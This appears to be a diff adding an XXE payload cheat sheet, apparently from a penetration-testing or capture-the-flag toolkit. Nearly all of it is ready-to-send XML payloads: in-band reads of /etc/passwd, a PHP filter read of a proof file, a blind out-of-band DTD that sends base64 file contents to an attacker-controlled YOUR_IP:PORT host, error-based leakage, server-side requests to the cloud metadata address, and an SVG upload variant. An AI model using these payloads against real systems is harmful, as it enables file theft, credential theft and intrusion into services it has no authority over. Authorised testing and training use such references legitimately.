@@ -1,0 +1,40 @@
+<!-- XXE — manual payload reference. Set Content-Type: application/xml. -->
+
+<!-- 1) Classic in-band file read (echo &xxe; in a reflected field) -->
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<r>&xxe;</r>
+
+<!-- 2) PHP filter read (base64, survives XML-breaking chars; great for source/proof) -->
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/root/proof.txt">]>
+<r>&xxe;</r>
+
+<!-- 3) Blind / OOB — host evil.dtd (see xxe-oob.sh), exfil via parameter entity -->
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://YOUR_IP:PORT/evil.dtd"> %ext;]>
+<r>&send;</r>
+<!-- evil.dtd:
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://YOUR_IP:PORT/leak?d=%file;'>">
+%eval;
+-->
+
+<!-- 4) Error-based (no egress) — leak file in a parse error -->
+<!-- evil.dtd:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%err;
+-->
+
+<!-- 5) SSRF via XXE (reach internal / cloud metadata) -->
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<r>&xxe;</r>
+
+<!-- 6) Billion-laughs DoS — denial of service; do NOT fire at a live target, here for awareness only -->
+
+<!-- File formats that carry XXE: .svg, .docx/.xlsx (word/document.xml), .xml, SOAP, SAML -->
+<!-- SVG upload sink: -->
+<!-- <svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg> -->
